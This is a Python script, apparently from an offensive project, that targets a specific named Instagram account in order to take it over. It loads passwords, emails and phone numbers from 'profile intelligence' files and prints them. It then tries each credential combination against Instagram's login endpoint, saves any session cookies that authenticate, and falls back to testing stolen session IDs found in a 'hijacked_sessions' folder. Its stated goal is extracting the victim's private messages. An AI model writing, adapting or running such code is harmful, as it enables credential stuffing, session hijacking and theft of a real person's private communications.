# -*- coding: utf-8 -*-
# pylint: disable=all
# flake8: noqa
# type: ignore
# mypy: ignore-errors
#!/usr/bin/env python3
"""
🔥 REAL SESSION REGENERATOR FOR ALX.TRADING
===========================================
Generate fresh session using real credentials - NO SIMULATION
"""

import json
import os
import requests
import time
from datetime import datetime

class RealSessionRegenerator:
    def __init__(self):
        self.target = "alx.trading"
        self.output_dir = "/workspaces/sugarglitch-realops/sessions_fresh"
        os.makedirs(self.output_dir, exist_ok=True)

        print("🔥 REAL SESSION REGENERATOR")
        print("=" * 50)
        print("⚠️  GENERATING FRESH SESSIONS - NO SIMULATION")

        # Load real credentials from profile data
        self.credentials = self.load_real_credentials()

    def load_real_credentials(self):
        """Load real credentials from profile intelligence"""
        print("\n🔍 Loading real credentials from profile data...")

        credentials = {
            'username': self.target,
            'passwords': [],
            'emails': [],
            'phones': []
        }

        profile_files = [
            "/workspaces/sugarglitch-realops/config/json/MASTER_PROFILE_alx_trading_1748264047.json",
            "/workspaces/sugarglitch-realops/config/json/MASTER_PROFILE_alx_trading_1748262733.json"
        ]

        for file_path in profile_files:
            try:
                if os.path.exists(file_path):
                    with open(file_path, 'r') as f:
                        data = json.load(f)

                    # Extract passwords
                    if 'profile' in data and 'confirmed_password' in data['profile']:
                        credentials['passwords'].append(data['profile']['confirmed_password'])

                    if 'intelligence_summary' in data:
                        summary = data['intelligence_summary']
                        if 'passwords' in summary:
                            credentials['passwords'].extend(summary['passwords'])
                        if 'email_addresses' in summary:
                            credentials['emails'].extend(summary['email_addresses'])
                        if 'phone_numbers' in summary:
                            credentials['phones'].extend(summary['phone_numbers'])

                    print(f"✅ Loaded: {os.path.basename(file_path)}")

            except Exception as e:
                print(f"❌ Error loading {file_path}: {e}")

        # Remove duplicates
        credentials['passwords'] = list(set(credentials['passwords']))
        credentials['emails'] = list(set(credentials['emails']))
        credentials['phones'] = list(set(credentials['phones']))

        print(f"📋 Real credentials found:")
        print(f"   Username: {credentials['username']}")
        print(f"   Passwords: {len(credentials['passwords'])}")
        print(f"   Emails: {len(credentials['emails'])}")
        print(f"   Phones: {len(credentials['phones'])}")

        for pwd in credentials['passwords']:
            print(f"   🔑 Password: {pwd}")
        for email in credentials['emails']:
            print(f"   📧 Email: {email}")
        for phone in credentials['phones']:
            print(f"   📱 Phone: {phone}")

        return credentials

    def attempt_real_login(self):
        """Attempt real login using actual credentials"""
        print(f"\n🔐 Attempting REAL login for {self.target}...")

        if not self.credentials['passwords']:
            print("❌ No passwords available for login")
            return None

        session = requests.Session()

        # Instagram login headers
        headers = {
            'User-Agent': 'Instagram 219.0.0.12.117 Android (28/9; 480dpi; 1080x2280; samsung; SM-G973F; beyond1; exynos9820; en_US; 278161719)',
            'Accept': '*/*',
            'Accept-Language': 'en-US',
            'Accept-Encoding': 'gzip, deflate',
            'X-Requested-With': 'XMLHttpRequest',
            'X-Instagram-AJAX': '1',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        session.headers.update(headers)

        # Get initial page and CSRF token
        try:
            print("🔍 Getting Instagram login page...")
            response = session.get('https://www.instagram.com/accounts/login/')

            if response.status_code == 200:
                import re
                csrf_match = re.search(r'"csrf_token":"([^"]+)"', response.text)
                if csrf_match:
                    csrf_token = csrf_match.group(1)
                    session.headers['X-CSRFToken'] = csrf_token
                    print(f"✅ CSRF token: {csrf_token[:20]}...")
                else:
                    print("❌ No CSRF token found")
                    return None
            else:
                print(f"❌ Login page not accessible: {response.status_code}")
                return None

        except Exception as e:
            print(f"❌ Error getting login page: {e}")
            return None

        # Try login with each credential combination
        login_attempts = []

        # Try username + password combinations
        for password in self.credentials['passwords']:
            login_attempts.append({
                'username': self.credentials['username'],
                'password': password,
                'type': 'username_password'
            })

        # Try email + password combinations
        for email in self.credentials['emails']:
            for password in self.credentials['passwords']:
                login_attempts.append({
                    'username': email,
                    'password': password,
                    'type': 'email_password'
                })

        # Try phone + password combinations
        for phone in self.credentials['phones']:
            for password in self.credentials['passwords']:
                login_attempts.append({
                    'username': phone,
                    'password': password,
                    'type': 'phone_password'
                })

        print(f"🎯 Trying {len(login_attempts)} login combinations...")

        for i, attempt in enumerate(login_attempts, 1):
            try:
                print(f"\n🔐 Attempt {i}/{len(login_attempts)}: {attempt['type']}")
                print(f"   Username: {attempt['username']}")
                print(f"   Password: {attempt['password'][:4]}***")

                # Instagram login payload
                login_data = {
                    'username': attempt['username'],
                    'password': attempt['password'],
                    'queryParams': '{}',
                    'optIntoOneTap': 'false'
                }

                # Send login request
                login_response = session.post(
                    'https://www.instagram.com/accounts/login/ajax/',
                    data=login_data,
                    timeout=30
                )

                print(f"   Status: {login_response.status_code}")

                if login_response.status_code == 200:
                    try:
                        response_data = login_response.json()
                        print(f"   Response: {response_data}")

                        if response_data.get('authenticated'):
                            print(f"   ✅ LOGIN SUCCESS!")

                            # Save successful session
                            session_data = {
                                'username': attempt['username'],
                                'login_method': attempt['type'],
                                'login_timestamp': datetime.now().isoformat(),
                                'cookies': dict(session.cookies),
                                'sessionid': session.cookies.get('sessionid'),
                                'status': 'authenticated'
                            }

                            session_file = f"{self.output_dir}/fresh_session_{int(time.time())}.json"
                            with open(session_file, 'w') as f:
                                json.dump(session_data, f, indent=2)

                            print(f"   📁 Session saved: {session_file}")
                            return session_data

                        elif 'checkpoint_required' in response_data:
                            print(f"   ⚠️ Checkpoint required")
                        elif 'two_factor_required' in response_data:
                            print(f"   ⚠️ 2FA required")
                        else:
                            print(f"   ❌ Login failed: {response_data.get('message', 'Unknown error')}")

                    except json.JSONDecodeError:
                        print(f"   ❌ Non-JSON response")

                else:
                    print(f"   ❌ HTTP {login_response.status_code}")

                # Rate limiting
                time.sleep(3)

            except Exception as e:
                print(f"   ❌ Error: {e}")

        print(f"\n❌ All login attempts failed")
        return None

    def attempt_session_hijacking(self):
        """Attempt to hijack or generate session using other methods"""
        print(f"\n🕷️ Attempting session hijacking techniques...")

        # This would implement real session hijacking techniques
        # For now, just check if we can find any working sessions

        # Check existing session files for any working tokens
        session_dirs = [
            "/workspaces/sugarglitch-realops/sessions",
            "/workspaces/sugarglitch-realops/hijacked_sessions",
            "/workspaces/sugarglitch-realops/real_messages"
        ]

        for session_dir in session_dirs:
            if os.path.exists(session_dir):
                for file in os.listdir(session_dir):
                    if file.endswith('.json') and 'session' in file.lower():
                        try:
                            file_path = os.path.join(session_dir, file)
                            with open(file_path, 'r') as f:
                                data = json.load(f)

                            # Look for sessionid
                            sessionid = None
                            if 'sessionid' in data:
                                sessionid = data['sessionid']
                            elif 'cookies' in data and 'sessionid' in data['cookies']:
                                sessionid = data['cookies']['sessionid']

                            if sessionid and len(sessionid) > 20:
                                print(f"   🔍 Found potential session: {file}")

                                # Test this session
                                test_session = requests.Session()
                                test_session.cookies.update({'sessionid': sessionid})

                                try:
                                    test_response = test_session.get('https://www.instagram.com/accounts/edit/', timeout=10)
                                    if test_response.status_code == 200 and 'login' not in test_response.url:
                                        print(f"   ✅ Working session found!")
                                        return {
                                            'sessionid': sessionid,
                                            'source': file,
                                            'status': 'hijacked'
                                        }
                                except Exception:
                                    pass

                        except Exception:
                            pass

        print(f"   ❌ No working sessions found")
        return None

    def run_session_generation(self):
        """Run complete session generation process"""
        print("🚀 Starting REAL session generation...")

        # Method 1: Try real login
        session_data = self.attempt_real_login()
        if session_data:
            print(f"\n✅ SUCCESS: Fresh session generated via login")
            return session_data

        # Method 2: Try session hijacking
        hijacked_session = self.attempt_session_hijacking()
        if hijacked_session:
            print(f"\n✅ SUCCESS: Working session hijacked")
            return hijacked_session

        print(f"\n❌ FAILED: Could not generate fresh session")
        print("💡 May need manual intervention or different approach")
        return None

if __name__ == "__main__":
    regenerator = RealSessionRegenerator()
    result = regenerator.run_session_generation()

    if result:
        print(f"\n🎉 Fresh session ready for DM extraction!")
        print(f"📁 Use this session for real DM extraction")
    else:
        print(f"\n❌ Could not generate fresh session")
        print("🔧 Manual session acquisition may be required")
